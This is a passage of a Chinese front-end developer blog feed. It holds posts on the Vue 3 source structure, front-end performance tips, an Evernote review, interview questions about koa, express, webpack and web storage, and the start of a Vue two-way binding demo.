<h3 id="走进源代码"><a href="#走进源代码" class="headerlink" title="走进源代码"></a>走进源代码</h3><h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><blockquote>
<p>我们主要需要关注package文件夹，里面包含了功能的实现</p>
<p><img src="/images/vue31.png" alt="My Pic"></p>
<ul>
<li>compiler-core 目录: 平台无关的编译器. 它既包含可扩展的基础功能，也包含所有平台无关的插件。</li>
<li>compiler-dom 目录: 针对浏览器而写的编译器。</li>
<li>reactivity 目录：数据响应式系统，这是一个单独的系统，可以与任何框架配合使用。</li>
<li>runtime-core 目录：与平台无关的运行时。其实现的功能有虚拟 DOM 渲染器、Vue 组件和 Vue 的各种API，我们可以利用这个 runtime 实现针对某个具体平台的高阶 runtime，比如自定义渲染器。</li>
<li>runtime-dom 目录: 针对浏览器的 runtime。其功能包括处理原生 DOM API、DOM 事件和 DOM 属性等。</li>
<li>runtime-test 目录: 一个专门为了测试而写的轻量级 runtime。由于这个 rumtime 「渲染」出的 DOM 树其实是一个 JS 对象，所以这个 runtime 可以用在所有 JS 环境里。你可以用它来测试渲染是否正确。它还可以用于序列化 DOM、触发 DOM 事件，以及记录某次更新中的 DOM 操作。</li>
<li>server-renderer 目录: 用于 SSR。尚未实现。</li>
<li>shared 目录: 没有暴露任何 API，主要包含了一些平台无关的内部帮助方法。</li>
<li>vue 目录: 用于构建「完整构建」版本，引用了上面提到的 runtime 和 compiler。</li>
</ul>
</blockquote>
<h4 id="runtime-core-模块"><a href="#runtime-core-模块" class="headerlink" title="runtime-core 模块"></a>runtime-core 模块</h4><blockquote>
<p>这部分包含了Vue中各种Api的实现以及生命周期等功能，我们可以在这个模块看看相应的方法的具体实现。<br>apiCreateComponent中是关于createComponent的实现<br>apiInject中是关于provide和inject的实现<br>apiLifecycle中是关于生命周期的实现<br>其他的大家可以自己去看看，这里就不再赘述了</p>
<p><img src="/images/vue32.png" alt="My Pic"></p>
</blockquote>
<h4 id="reactivity-模块"><a href="#reactivity-模块" class="headerlink" title="reactivity 模块"></a>reactivity 模块</h4><blockquote>
<p>这个文件主要是数据响应模块的实现。其暴露的主要 API 有 ref（数据容器）、reactive（基于 Proxy 实现的响应式数据）、computed（计算数据）、effect（副作用） 等几部分。</p>
<p><img src="/images/vue33.png" alt="My Pic"><br>下面是一个源码实现的一个方法createReactiveObject,可以看到里面已经是使用Proxy了<br><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createReactiveObject</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  target: <span class="built_in">any</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  toProxy: WeakMap&lt;<span class="built_in">any</span>, <span class="built_in">any</span>&gt;,</span></span></span><br><span class="line"><span class="function"><span class="params">  toRaw: WeakMap&lt;<span class="built_in">any</span>, <span class="built_in">any</span>&gt;,</span></span></span><br><span class="line"><span class="function"><span class="params">  baseHandlers: ProxyHandler&lt;<span class="built_in">any</span>&gt;,</span></span></span><br><span class="line"><span class="function"><span class="params">  collectionHandlers: ProxyHandler&lt;<span class="built_in">any</span>&gt;</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!isObject(target)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">      <span class="built_in">console</span>.warn(<span class="string">`value cannot be made reactive: <span class="subst">$&#123;String(target)&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// target already has corresponding Proxy</span></span><br><span class="line">  <span class="keyword">let</span> observed = toProxy.get(target)</span><br><span class="line">  <span class="keyword">if</span> (observed !== <span class="built_in">void</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> observed</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// target is already a Proxy</span></span><br><span class="line">  <span class="keyword">if</span> (toRaw.has(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// only a whitelist of value types can be observed.</span></span><br><span class="line">  <span class="keyword">if</span> (!canObserve(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> handlers = collectionTypes.has(target.constructor)</span><br><span class="line">    ? collectionHandlers</span><br><span class="line">    : baseHandlers</span><br><span class="line">  observed = <span class="keyword">new</span> Proxy(target, handlers)</span><br><span class="line">  toProxy.set(target, observed)</span><br><span class="line">  toRaw.set(observed, target)</span><br><span class="line">  <span class="keyword">if</span> (!targetMap.has(target)) &#123;</span><br><span class="line">    targetMap.set(target, <span class="keyword">new</span> Map())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> observed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h4 id="runtime-dom-模块"><a href="#runtime-dom-模块" class="headerlink" title="runtime-dom 模块"></a>runtime-dom 模块</h4><blockquote>
<p>这部分主要是写的浏览器上的 runtime，主要功能是适配了浏览器环境下节点和节点属性的增删改查。它暴露了两个重要 API：render 和 createApp，并声明了一个 ComponentPublicInstance 接口。</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRenderer &#125; <span class="keyword">from</span> <span class="string">'@vue/runtime-core'</span></span><br><span class="line"><span class="keyword">import</span> &#123; nodeOps &#125; <span class="keyword">from</span> <span class="string">'./nodeOps'</span></span><br><span class="line"><span class="keyword">import</span> &#123; patchProp &#125; <span class="keyword">from</span> <span class="string">'./patchProp'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; render, createApp &#125; = createRenderer&lt;Node, Element&gt;(&#123;</span><br><span class="line">  patchProp,</span><br><span class="line">  ...nodeOps</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; render, createApp &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// re-export everything from core</span></span><br><span class="line"><span class="comment">// h, Component, reactivity API, nextTick, flags &amp; types</span></span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">'@vue/runtime-core'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> ComponentPublicInstance &#123;</span><br><span class="line">  $el: Element</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><blockquote>
<p>这次就先介绍这几个模块了，大家还是可以自己去看看。之后还会给大家介绍，相应的demo的编写以及运行其中编写好的测试demo。</p>
</blockquote>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>前端性能优化</title>
    <url>/2018/03/13/%E5%89%8D%E7%AB%AF%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近查了很多关于这方面的资料，其中有自己知道的，也有自己不知道的。所有就做了一个小小的总结。总的来说前端性能的优化按照优化的对象分为页面级优化和代码级优化。</p>
<h1 id="（一）页面级优化"><a href="#（一）页面级优化" class="headerlink" title="（一）页面级优化"></a>（一）页面级优化</h1><h2 id="1-将css放在head中（这个应该知道）"><a href="#1-将css放在head中（这个应该知道）" class="headerlink" title="1.将css放在head中（这个应该知道）"></a>1.将css放在head中（这个应该知道）</h2><p>如果将CSS放在其他地方比如body中，则浏览器有可能还未下载和解析到 CSS就已经开始渲染页面了，就会导致用户体验不好。</p>
<h2 id="2-将外部js放在底部（这个应该知道）"><a href="#2-将外部js放在底部（这个应该知道）" class="headerlink" title="2.将外部js放在底部（这个应该知道）"></a>2.将外部js放在底部（这个应该知道）</h2><p>有些脚本中的操作需要等到页面加载完成之后才能执行，因此放在最下面保证代码的正常执行。脚本在加载时却会阻塞其他资源，例如在脚本加载完成之前，它后面的图片、样式以及其他脚本都处于阻塞状态，直到脚本加载完成后才会开始加载。如果将脚本放在比较靠前的位置，则会影响整个页面的加载速度从而影响用户体验。<br><a id="more"></a></p>
<h2 id="3-减少http请求数（这个应该知道）"><a href="#3-减少http请求数（这个应该知道）" class="headerlink" title="3.减少http请求数（这个应该知道）"></a>3.减少http请求数（这个应该知道）</h2><p>但具体哪些操作呢？看到一篇文章写得比较完整，包括 从设计实现层面简化页面、合理设置 HTTP缓存(很少变化的资源)、资源合并与压缩(比如gulp来压缩)、 CSS Sprites、Inline Images(这个不是很理解,作者的说明是:使用 data: URL scheme的方式将图片嵌入到页面或CSS中，如果不考虑资源管理上的问题的话，不失为一个好办法。如果是嵌入页面的话换来的是增大了页面的体积，而且无法利用浏览器缓存。使用在 CSS中的图片则更为理想一些)、Lazy Load Images。</p>
<h2 id="4-异步执行-inline脚本"><a href="#4-异步执行-inline脚本" class="headerlink" title="4.异步执行 inline脚本"></a>4.异步执行 inline脚本</h2><p>防止阻塞,由于浏览器在页面处理方面是单线程的，当inline脚本在页面渲染之前执行时，页面的渲染工作则会被推迟。简而言之，inline脚本在执行的时候，页面处于空白状态。鉴于以上两点原因，建议将执行时间较长的inline脚本异步执行，异步的方式有很多种，例如使用script元素的defer属性(存在兼容性问题和其他一些问题，例如不能使用document.write)、使用setTimeout，此外，在HTML5中引入了Web Workers的机制，恰恰可以解决此类问题。</p>
<h2 id="5-Lazy-Load-Javascript"><a href="#5-Lazy-Load-Javascript" class="headerlink" title="5. Lazy Load Javascript"></a>5. Lazy Load Javascript</h2><p>按需加载,随着Javascript框架的流行，越来越多的站点也使用起了框架。不过，一个框架往往包括了很多的功能实现，这些功能并不是每一个页面都需要的，如果下载了不需要的脚本则算得上是一种资源浪费-既浪费了带宽又浪费了执行花费的时间。目前的做法大概有两种，一种是为那些流量特别大的页面专门定制一个专用的mini版框架，另一种则是LazyLoad。YUI则使用了第二种方式，在YUI的实现中，最初只加载核心模块，其他模块可以等到需要使用的时候才加载。</p>
<h2 id="6-异步请求-Callback"><a href="#6-异步请求-Callback" class="headerlink" title="6.异步请求 Callback"></a>6.异步请求 Callback</h2><p>将一些行为样式提取出来，慢慢的加载信息的内容。作者举例：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Callback函数*/</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myCallback</span>(<span class="params">info</span>)</span>&#123;  </span><br><span class="line"><span class="comment">//do something here  </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*Html中*/</span></span><br><span class="line">&lt;script type=”text/javascript” src=”http:<span class="comment">//abc.com/cb”&gt;&lt;/script&gt; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*cb返回内容*/</span></span><br><span class="line">myCallback(‘Hello world!’);</span><br></pre></td></tr></table></figure></p>
<h2 id="7-减少不必要的-HTTP跳转"><a href="#7-减少不必要的-HTTP跳转" class="headerlink" title="7.减少不必要的 HTTP跳转"></a>7.减少不必要的 HTTP跳转</h2><p>避免重定向,对于以目录形式访问的HTTP链接，很多人都会忽略链接最后是否带’/‘，假如你的服务器对此是区别对待的话，那么你也需要注意，这其中很可能隐藏了 301跳转，增加了多余请求。具体参见下图，其中第一个链接是以无 ’/‘结尾的方式访问的，于是服务器有了一次跳转。</p>
<h2 id="8-避免重复的资源请求"><a href="#8-避免重复的资源请求" class="headerlink" title="8.避免重复的资源请求"></a>8.避免重复的资源请求</h2><p>这种情况主要是由于疏忽或页面由多个模块拼接而成，然后每个模块中请求了同样的资源时，会导致资源的重复请求</p>
<h1 id="（二）代码级优化"><a href="#（二）代码级优化" class="headerlink" title="（二）代码级优化"></a>（二）代码级优化</h1><h2 id="1-Dom操作"><a href="#1-Dom操作" class="headerlink" title="1.Dom操作"></a>1.Dom操作</h2><p>DOM操作应该是脚本中最耗性能的一类操作，例如增加、修改、删除 DOM元素或者对 DOM集合进行操作。其中有以下几点要注意</p>
<h3 id="1-1-HTML-Collection"><a href="#1-1-HTML-Collection" class="headerlink" title="1.1 HTML Collection"></a>1.1 HTML Collection</h3><p>遍历 HTMLCollection的时候，尽量将它转为数组后再访问，以提高性能。即使不转换为数组，也请尽可能少的访问它，例如在遍历的时候可以将 length属性、成员保存到局部变量后再使用局部变量。</p>
<h3 id="1-2-Reflow-amp-Repaint"><a href="#1-2-Reflow-amp-Repaint" class="headerlink" title="1.2 Reflow &amp; Repaint"></a>1.2 Reflow &amp; Repaint</h3><p>即重绘和回流 首先我们要知道哪些操作会引起这两个东西。repaint：如果只是改变某个元素的背景色、文字颜色、边框颜色等等不影响它周围或内部布局的属性，将只会引起浏览器 repaint（重绘）。repaint 的速度明显快于 reflow。reflow:改变窗口大小、改变文字大小、内容的改变，如用户在输入框中敲字、激活伪类，如:hover、操作class属性、脚本操作DOM、计算offsetWidth和offsetHeight、设置style属性。如何减少呢？见下一篇blog</p>
<h2 id="2-慎用-with"><a href="#2-慎用-with" class="headerlink" title="2.慎用 with"></a>2.慎用 with</h2><p>with相当于增加了作用域链长度，每次查找作用域链都是要消耗时间的，过长的作用域链会导致查找性能下降。</p>
<h2 id="3-避免使用-eval和-Function"><a href="#3-避免使用-eval和-Function" class="headerlink" title="3.避免使用 eval和 Function"></a>3.避免使用 eval和 Function</h2><p>每次 eval 或 Function 构造函数作用于字符串表示的源代码时，脚本引擎都需要将源代码转换成可执行代码。这是很消耗资源的操作 —— 通常比简单的函数调用慢 100倍以上。</p>
<h2 id="4-减少作用域链查找"><a href="#4-减少作用域链查找" class="headerlink" title="4.减少作用域链查找"></a>4.减少作用域链查找</h2><p>如果在循环中需要访问非本作用域下的变量时请在遍历之前用局部变量缓存该变量，并在遍历结束后再重写那个变量，这一点对全局变量尤其重要，因为全局变量处于作用域链的最顶端，访问时的查找次数是最多的。还可以减少闭包的使用。作者举例:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">低效率的写法：</span><br><span class="line"><span class="comment">// 全局变量 </span></span><br><span class="line"><span class="keyword">var</span> globalVar = <span class="number">1</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myCallback</span>(<span class="params">info</span>)</span>&#123; </span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">100000</span>; i--;)&#123; </span><br><span class="line"><span class="comment">//每次访问 globalVar 都需要查找到作用域链最顶端，本例中需要访问 100000 次 </span></span><br><span class="line">globalVar += i; </span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">更高效的写法：</span><br><span class="line"><span class="comment">// 全局变量 </span></span><br><span class="line"><span class="keyword">var</span> globalVar = <span class="number">1</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myCallback</span>(<span class="params">info</span>)</span>&#123; </span><br><span class="line"><span class="comment">//局部变量缓存全局变量 </span></span><br><span class="line"><span class="keyword">var</span> localVar = globalVar; </span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">100000</span>; i--;)&#123; </span><br><span class="line"><span class="comment">//访问局部变量是最快的 </span></span><br><span class="line">localVar += i; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="5-CSS选择符"><a href="#5-CSS选择符" class="headerlink" title="5.CSS选择符"></a>5.CSS选择符</h2><p>在大多数人的观念中，都觉得浏览器对CSS选择符的解析式从左往右进行的，例如:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#toc A &#123; color: #444; &#125;</span><br></pre></td></tr></table></figure></p>
<p>这样一个选择符，如果是从右往左解析则效率会很高，因为第一个ID选择基本上就把查找的范围限定了，但实际上浏览器对选择符的解析是从右往左进行的。如上面的选择符，浏览器必须遍历查找每一个A标签的祖先节点，效率并不像之前想象的那样高。根据浏览器的这一行为特点，在写选择符的时候需要注意很多事项。<br>转自<a href="https://www.cnblogs.com/subying/p/3661807.html" target="_blank" rel="noopener">关于浏览器css选择器性能优化</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">选择器效率高低排序</span><br><span class="line">1.id选择器（#myid）</span><br><span class="line">2.类选择器（.myclassname）</span><br><span class="line">3.标签选择器（div,h1,p）</span><br><span class="line">4.相邻选择器（h1+p）</span><br><span class="line">5.子选择器（ul &lt; li）</span><br><span class="line">6.后代选择器（li a）</span><br><span class="line">7.通配符选择器（*）</span><br><span class="line">8.属性选择器（a[rel=&quot;external&quot;]）</span><br><span class="line">9.伪类选择器（a:hover,li:nth-child）</span><br><span class="line"></span><br><span class="line">注意的几点</span><br><span class="line">1.id选择器肯定是最快，但是不要在ID选择器使用的同时再使用标签或类选择器了，这点上jquery也是一样的。</span><br><span class="line">不要出现这样的写法 &quot;div#content&quot; 或者 &quot;#content.text&quot;。David Hyatt的第一段话中有说到了，样式系统从最右边的选择符开始向左进行匹配规则。只要当前选择符的左边还有其他选择符，样式系统就会继续向左移动，直到找到和规则匹配的元素，或者因为不匹配而退出。，而​在html中ID是唯一的，如果真的是用了 &quot;div#content&quot;，浏览器通过ID定位到了具体的元素，然后发现左侧还是标签选择器，那么就会继续匹配，继续查找元素，这样无疑损耗了浏览器的性能，影响了渲染时间。</span><br><span class="line"></span><br><span class="line">2.​不要在类选择器时用标签选择器，这点跟jquery是刚好相反的。不要出现这样的写法 &quot;div.text&quot;，从css的效率来看，类选择器（class）是比标签选择器要好，这样的写法只会增加了查找的难度，如果真的是根据标签来区分样式的话，考虑写不同的class。</span><br><span class="line"></span><br><span class="line">3.​​如果明确dom结构，先使用子选择器，减少后代选择器使用，这点跟jquery的对比没有留意和实践，本人认为是相反的。如果你的写法是这样 &quot;div a&quot;，而实际上div 跟 a 是父子关系，如果合适更建议是这么用 &quot;div&gt;a&quot;，这样效率高一些，但是不是最好的方案，下面这一点的方案会更好一些。</span><br><span class="line"></span><br><span class="line">4. 使用类选择器替代后代选择器和子选择器，这点上跟jquery是不一样的。</span><br><span class="line">如果你的写法是这样 &quot;div a&quot; &quot;div&gt;a&quot;，虽然前面建议用子选择器替换后代选择器，但是这两个的方式还是效率低，David Hyatt的第3段话：后代选择器在CSS中是最昂贵的选择器。贵得要命——尤其是把它和标签或通配符放在一起！​ ​毫无疑问，我们要想其他的方式来替换这种书写方式，那么可以考虑这样的写法：div对应的为&quot;.div-text&quot; a对应的为&quot;.div-text-a&quot;，从命名上来关联两者，在查看的时候逻辑也会清晰很多。</span><br><span class="line">​</span><br><span class="line">5. ​尽量使用继承来避免写重复的样式，这点与jquery没有关系了。你可能会这样写 &quot;#text&#123;&#125; #text&gt;.span:&#123;font-size:24px;&#125; #text&gt;.a&#123;font-size:24px;&#125;&quot; ，那么可以这么写&quot;.text&#123;font-size:24px;&#125;&quot;，让下面的继承这个样式。</span><br><span class="line"></span><br><span class="line">　 这些我对css选择器的一些看法，上面没有说到的就是通配符选择器（*）和属性选择器，这个其实才是最消耗性能的，因为是针对所有的元素，即便是配合其他的选择器来用也很耗性能。实际上的ID选择器使用的机会不是很高，因为Html中的ID是唯一的，不会有很多的ID。那么从上面的分析，可以得到这么一个规则：尽量使用类选择器(class)​，避免使用通配符选择器（*）​和属性选择器，后代选择器和子选择器也尽量避免。</span><br></pre></td></tr></table></figure></p>
<h2 id="6-html"><a href="#6-html" class="headerlink" title="6.html"></a>6.html</h2><p>对Html本身进行优化</p>
<h2 id="7-图片压缩"><a href="#7-图片压缩" class="headerlink" title="7.图片压缩"></a>7.图片压缩</h2>]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title>印象笔记</title>
    <url>/2018/02/15/%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0-1/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最近下了一个印象笔记，感觉使用起来挺方便的。笔记里面自带的功能挺多的，基本上满足了我的需求。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;*有表格</p>
<p>&nbsp;&nbsp;&nbsp;*复选框</p>
<p>&nbsp;&nbsp;&nbsp;*各种字体排版</p>
<p>&nbsp;&nbsp;&nbsp;*里面带有表格</p>
<p>&nbsp;&nbsp;&nbsp;*添加附件和图片</p>
<p><img src="/images/biji1.png" alt=""><br><img src="/images/biji2.png" alt=""></p>
]]></content>
      <categories>
        <category>软件分享</category>
      </categories>
      <tags>
        <tag>-印象笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>又是一次面试</title>
    <url>/2019/04/10/%E5%8F%88%E6%98%AF%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;又双参加了一个视屏面试，总的来说问的问题还会挺全面的但关于Css的知识问的还是比较少。其他的问题来说自己还是有一些知识点掌握的不是很好，有些概念性的东西没去深入了解过。下面就是自己记忆中答得不是很好的一些知识点：<br><a id="more"></a></p>
<h2 id="1-express-和-koa中间件的区别"><a href="#1-express-和-koa中间件的区别" class="headerlink" title="1.express 和 koa中间件的区别"></a>1.express 和 koa中间件的区别</h2><p>先简单看一个表格吧</p>
<p><table> <tr><td>名称</td><td>说明</td><td>对应</td><td>经典</td></tr><tr><td>express</td><td>web框架</td><td>ES5</td><td>回调嵌套</td></tr><tr><td>koa</td><td>web框架</td><td>ES6</td><td>Generator函数+yield语句+Promise</td></tr><tr><td>koa2</td><td>web框架</td><td>ES7</td><td>async/await+Promise</td></tr></table><br>express用Application、Request、Response、Router四个主要模块，模拟了一个完整的web服务器功能，对了，express还在相当长的一段时期中受到了Connect的影响。在使用express的过程中，你会发现express是一个极简的、灵活的 web 应用开发框架，它提供的这一系列强大的特性，可以帮助你快速创建各种 web 和移动设备应用。<br>koa中也包含4个主要模块，Application、Request、Response、Context。此时，router已经被排除在内核之外了。其实，koa只是一个“中间架”，几乎所有的功能都需要由第三方中间件来协同完成。例如koa的router模块，就有20多个，优胜劣汰，自由选择……虽然有不规范之嫌，但是，koa是规范的这就足够了。使用koa，可以最大限度的发挥自己的想象力，利用koa，构建各种个性化的web与移动应用。connect的中间件是线性的，next过后继续寻找下一个中间件，这种模式直觉上也很好理解，中间件就是一系列数组，通过路由匹配来寻找相应路由的处理方法也就是中间件。事实上connect也是这么实现的。app.use 就是往中间件数组中塞入新的中间件。中间件的执行则依靠私有方法 app.handle 进行处理，express也是相同的道理。而koa中间件是洋葱圈模型，也就是koa处理完中间件后还会回来走一趟，这就给了我们更加大的操作空间，很明显，当koa处理中间件遇到await next()的时候会暂停当前中间件进而处理下一个中间件，最后再回过头来继续处理剩下的任务，虽然说起来很复杂，但是直觉上我们会有一种隐隐熟悉的感觉：不就是回调函数吗。这里暂且不说具体实现方法，但是确实就是回调函数。跟async/await的特性并无任何关系。</p>
<h2 id="2-如何全局捕获错误"><a href="#2-如何全局捕获错误" class="headerlink" title="2.如何全局捕获错误"></a>2.如何全局捕获错误</h2><p>当被问到错误捕获这个问题时，自己只想到了try catch。当面试官问还有什么其他方法时，自己就楞住了，想了半天也没想出了。下来之后自己就查了一下，原来有个全局捕获错误的方法window.onerror 除此之外我们还能主动的抛出错误通过throw方法。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局捕获错误</span></span><br><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">message, url, line, column, error</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'error'</span>,message, url, line, column, error)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(error) <span class="comment">//打印未定义的变量  捕获到错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(error)</span><br><span class="line">&#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(err)</span><br></pre></td></tr></table></figure></p>
<h2 id="3-webpack与gulp的区别"><a href="#3-webpack与gulp的区别" class="headerlink" title="3.webpack与gulp的区别"></a>3.webpack与gulp的区别</h2><p>1.Gulp侧重于前端开发的 整个过程 的控制管理（像是流水线），我们可以通过给gulp配置不通的task（通过Gulp中的gulp.task()方法配置，比如启动server、sass/less预编译、文件的合并压缩等等）来让gulp实现不同的功能，从而构建整个前端开发流程。<br>2.Webpack有人也称之为 模块打包机 ，由此也可以看出Webpack更侧重于模块打包，当然我们可以把开发中的所有资源（图片、js文件、css文件等）都可以看成模块，最初Webpack本身就是为前端JS代码打包而设计的，后来被扩展到其他资源的打包处理。Webpack是通过loader（加载器）和plugins（插件）对资源进行处理的。<br>3.另外我们知道Gulp是对整个过程进行控制，所以在其配置文件（gulpfile.js）中配置的每一个task对项目中 该task配置路径下所有的资源 都可以管理。比如，对sass文件进行预编译的task可以对其配置路径下的所有sass文件进行预编译处理</p>
<h2 id="4-jsonp只能post的原因"><a href="#4-jsonp只能post的原因" class="headerlink" title="4.jsonp只能post的原因"></a>4.jsonp只能post的原因</h2><p>之前了自己以为因为参数需要拼接在url上，所以只能使用get请求。但感觉回答之后不是那么的正确，于是下来之后就查了一下。因为 JSONP 的原理是通过「动态创建script」实现的，「动态创建script」只能用「get」，不能用「post」。</p>
<h2 id="5-Es6函数默认赋值"><a href="#5-Es6函数默认赋值" class="headerlink" title="5.Es6函数默认赋值"></a>5.Es6函数默认赋值</h2><p>当给函数默认值赋值为undefined时，给函数传递空、undefined、null最终获取到的参数值是什么。直接上代码把吧<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">x=undefined</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x)</span><br><span class="line">&#125;</span><br><span class="line">test() <span class="comment">//undefined</span></span><br><span class="line">test(<span class="literal">undefined</span>) <span class="comment">//undefined</span></span><br><span class="line">test(<span class="literal">null</span>) <span class="comment">//null</span></span><br></pre></td></tr></table></figure></p>
<p>当传入的参数为空或者是undefined时就会使用到默认的赋值</p>
<h2 id="6-localstoryge和sessionstoryge"><a href="#6-localstoryge和sessionstoryge" class="headerlink" title="6.localstoryge和sessionstoryge"></a>6.localstoryge和sessionstoryge</h2><p>提到这两个就必须还要加上cookie，下面用一张表来解释一下吧</p>
<p><table> <tr><td>特性</td><td>Cookie</td><td>localStorage</td><td>sessionStorage</td></tr><tr><td>数据的生命期</td><td>一般由服务器生成，可设置失效时间。如果在浏览器端生成Cookie，默认是关闭浏览器后失效</td><td>除非被清除，否则永久保存</td><td>仅在当前会话下有效，关闭页面或浏览器后被清除</td></tr><tr><td>存放数据大小</td><td>4K左右</td><td colspan="2">一般为5MB</td></tr><tr><td>与服务器端通信</td><td>每次都会携带在HTTP头中，如果使用cookie保存过多数据会带来性能问题</td><td colspan="2">仅在客户端（即浏览器）中保存，不参与和服务器的通信</td></tr><tr><td>易用性</td><td>需要程序员自己封装，源生的Cookie接口不友好</td><td colspan="2">源生接口可以接受，亦可再次封装来对Object和Array有更好的支持</td></tr></table><br>还有就是localstoryge能够跨域么  答案是当然不能拉 同理其他也不行</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>双向数据绑定</title>
    <url>/2018/10/08/%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;昨天看了别人的一篇，写如何实现vue双向数据绑定的文章。自己以前也了解过，主要是靠Object.defineProperty中的get和set来实现对数据的监听。但是具体要让我写出来，还真是一脸懵逼。所以有些东西还是要自己真正的写出来，才能更好的理解它的原理。于是下面我也自己写了一个小demo来实现vue的双向数据绑定。<br><a id="more"></a><br>先照着vue的demo写一个模型出来<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;vue&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  form&#123;</span><br><span class="line">    width:500px;</span><br><span class="line">    height:300px;</span><br><span class="line">    background: #000000;</span><br><span class="line">    position: absolute;</span><br><span class="line">    left:50%;</span><br><span class="line">    top:50%;</span><br><span class="line">    transform: translate(-50%,-50%);</span><br><span class="line">    border-radius: 15px;</span><br><span class="line">  &#125;</span><br><span class="line">  form&gt;p&#123;</span><br><span class="line">    color:#ffffff;</span><br><span class="line">    padding:10px 30px;</span><br><span class="line">  &#125;</span><br><span class="line">  form&gt;input&#123;</span><br><span class="line">    margin:10px 30px;</span><br><span class="line">    width:300px;</span><br><span class="line">    height:30px;</span><br><span class="line">    font-size: 26px;</span><br><span class="line">    padding-left:5px;</span><br><span class="line">    border-radius: 5px;</span><br><span class="line">  &#125;</span><br><span class="line">  form&gt;button&#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    width:50px;</span><br><span class="line">    height:35px;</span><br><span class="line">    top:-5px;</span><br><span class="line">    border-radius: 5px;</span><br><span class="line">    font-size: 16px;</span><br><span class="line">  &#125;</span><br><span class="line">  form&gt;h3&#123;</span><br><span class="line">    color:#ffffff;</span><br><span 